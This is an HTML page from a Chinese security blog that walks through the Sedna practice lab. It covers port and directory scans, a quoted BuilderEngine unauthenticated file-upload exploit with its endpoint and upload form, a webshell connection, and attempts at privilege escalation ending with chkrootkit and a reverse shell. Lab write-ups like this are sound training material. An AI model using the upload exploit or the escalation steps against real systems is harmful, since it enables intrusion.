@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/57.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/57.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="exploit,vulnerablility,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HexChristmas's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="这段时间自己练了一些靶场">
+<meta name="keywords" content="exploit,vulnerablility">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sedna靶场">
+<meta property="og:url" content="https://hexchristmas.github.io/2d97d5ef.html">
+<meta property="og:site_name" content="HexChristmas&#39;s Blog">
+<meta property="og:description" content="这段时间自己练了一些靶场">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w1.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w2.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w3.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w4.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w5.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w7.png">
+<meta property="og:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w8.png">
+<meta property="og:updated_time" content="2020-04-09T11:10:57.497Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sedna靶场">
+<meta name="twitter:description" content="这段时间自己练了一些靶场">
+<meta name="twitter:image" content="https://hexchristmas.github.io/2d97d5ef.htm/w1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hexchristmas.github.io/2d97d5ef.html">
+
+
+
+
+
+  <title>Sedna靶场 | HexChristmas's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/HexChristmas" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HexChristmas's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexchristmas.github.io/2d97d5ef.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hex Christmas">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HexChristmas's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Sedna靶场</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-13T23:00:15+08:00">
+                2019-12-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  这段时间自己练了一些靶场
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><img src="/2d97d5ef.htm/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"> </p>
+<h3 id="开放端口："><a href="#开放端口：" class="headerlink" title="开放端口："></a>开放端口：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22 53 80 110 111 139 143 445 993 995 8080</span><br></pre></td></tr></table></figure>
+<h3 id="开放服务："><a href="#开放服务：" class="headerlink" title="开放服务："></a>开放服务：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 6.6.1p1  </span><br><span class="line">ISC BIND 9.9.5-3</span><br><span class="line">Apache httpd 2.4.7 Dovecot pop3d</span><br><span class="line">Samba smbd 3.X - 4.X ssl/imaps?</span><br><span class="line">Apache Tomcat7/Coyote JSP engine 1.1</span><br></pre></td></tr></table></figure>
+<h3 id="暴力目录探测"><a href="#暴力目录探测" class="headerlink" title="暴力目录探测"></a>暴力目录探测</h3><table>
+<thead>
+<tr>
+<th>links</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> <a href="http://192.168.88.134/blocks/" target="_blank" rel="noopener">http://192.168.88.134/blocks/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/files/" target="_blank" rel="noopener">http://192.168.88.134/files/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/index.html" target="_blank" rel="noopener">http://192.168.88.134/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/robots.txt" target="_blank" rel="noopener">http://192.168.88.134/robots.txt</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/server" target="_blank" rel="noopener">http://192.168.88.134/server</a></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/license.txt" target="_blank" rel="noopener">http://192.168.88.134/license.txt</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/fonts/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/helpers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/libraries/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/core/compat/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/mysql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/odbc/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/language/english/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/mssql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/mysql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td> <a href="http://192.168.88.134/system/database/drivers/odbc/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/index.html</a></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>根据nmap扫描出来的端口和服务看了看貌似没啥能利用的漏洞，看一下dirb都爬到了什么信息，全部看完，发现没什么思路，又仔细看了第二遍，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.134/license.txt</span><br></pre></td></tr></table></figure></p>
+<p>这个地方<br><img src="/2d97d5ef.htm/w2.png" alt="2|690x316"><br>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，</p>
+<p>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，<br><img src="/2d97d5ef.htm/w3.png" alt="3|690x386"> </p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="初步利用"><a href="#初步利用" class="headerlink" title="初步利用"></a>初步利用</h2><p> 谷歌告诉我们这个的确存在漏洞，漏洞大概在BuilderEngine任意文件上传，<br>查看exploit-db，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted File Upload:</span><br><span class="line">	POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/</span><br><span class="line">	Vulnerable Parameter: files[]</span><br><span class="line">	We can upload test.php and reach the file via the following link:</span><br><span class="line">	/files/test.php--&gt;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>告诉我们，要我们把下面的代码以post方式传上去<br><img src="/2d97d5ef.htm/w4.png" alt="4|690x386"> </p>
+<p>用蚁剑连接shell<br><img src="/2d97d5ef.htm/w5.png" alt="5|690x450"> </p>
+<p>查看第一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![6|690x456](w6.png) </span><br><span class="line"></span><br><span class="line">## 深度利用</span><br><span class="line">深入，我们发现我们的用户是www-data权限，我们cat /etc/os-release发现这个系统是ubuntu14.04.1，其实我们</span><br></pre></td></tr></table></figure></p>
+<p>NAME=”Ubuntu”<br>VERSION=”14.04.1 LTS, Trusty Tahr”<br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=”Ubuntu 14.04.1 LTS”<br>VERSION_ID=”14.04”<br>HOME_URL=”<a href="http://www.ubuntu.com/&quot;" target="_blank" rel="noopener">http://www.ubuntu.com/&quot;</a><br>SUPPORT_URL=”<a href="http://help.ubuntu.com/&quot;" target="_blank" rel="noopener">http://help.ubuntu.com/&quot;</a><br>BUG_REPORT_URL=<a href="http://bugs.launchpad.net/ubuntu/" target="_blank" rel="noopener">http://bugs.launchpad.net/ubuntu/</a><br><code>`</code><br><img src="/2d97d5ef.htm/w7.png" alt="7|690x382"><br>通过seachsploit搜索相关exploit，发现可用的有脏牛，还有一个内核提权的漏洞，我们上船之后，发现编译执行无法提权，<br>我们根据我们之前nmap出的信息，openssh版本太高没啥可利用的漏洞，<br>脏牛，我们发现一祭出脏牛，吧唧就崩溃了，<br>apache2.4.7貌似有一个信息泄漏，我们要的是拿flag提权对吧，也没啥用，不关注了<br>Apachetomcat7，有一个cve-2016-1240本地提权的，exp传上去发现明明存在comcat7但是就是提不了权，继续看<br>我们继续google，发现可以用chkrootkit0.49提权，反弹shell监听msf利用拿flag<br><img src="/2d97d5ef.htm/w8.png" alt="8|690x470"></p>
+
+      
+    </div>
+    
+    
+    
+
+<div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>Sedna靶场</p>
+  <p><span>文章作者:</span>Hex Christmas</p>
+  <p><span>发布时间:</span>2019年12月13日 - 23:00:15</p>
+  <p><span>最后更新:</span>2020年04月09日 - 19:10:57</p>
+  <p><span>原始链接:</span><a href="/2d97d5ef.html" title="Sedna靶场">https://hexchristmas.github.io/2d97d5ef.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://hexchristmas.github.io/2d97d5ef.html" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+
+    
+</div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
+          
+            <a href="/tags/vulnerablility/" rel="tag"><i class="fa fa-tag"></i> vulnerablility</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ebe5bf2a.html" rel="next" title="nmap高级用法">
+                <i class="fa fa-chevron-left"></i> nmap高级用法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/925a634a.html" rel="prev" title="Archlinux&Debian安装kvm">
+                Archlinux&Debian安装kvm <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Hex Christmas">
+            
+              <p class="site-author-name" itemprop="name">Hex Christmas</p>
+              <p class="site-description motion-element" itemprop="description">Security Researcher</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tag/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.</span> <span class="nav-text">Nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开放端口："><span class="nav-number">1.1.1.</span> <span class="nav-text">开放端口：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开放服务："><span class="nav-number">1.1.2.</span> <span class="nav-text">开放服务：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴力目录探测"><span class="nav-number">1.1.3.</span> <span class="nav-text">暴力目录探测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞发现"><span class="nav-number">2.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初步利用"><span class="nav-number">3.1.</span> <span class="nav-text">初步利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hex Christmas</span>
+
+  
+</div>
+<!--
+
+ <div class="powered-by">{#
+  }由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<div class="theme-info">{#
+  <div class="theme-info">{#
+  }主题 &mdash; {#
+  }<a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">{#
+    }NexT.Gemini v5.1.4
+
+
+-->
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
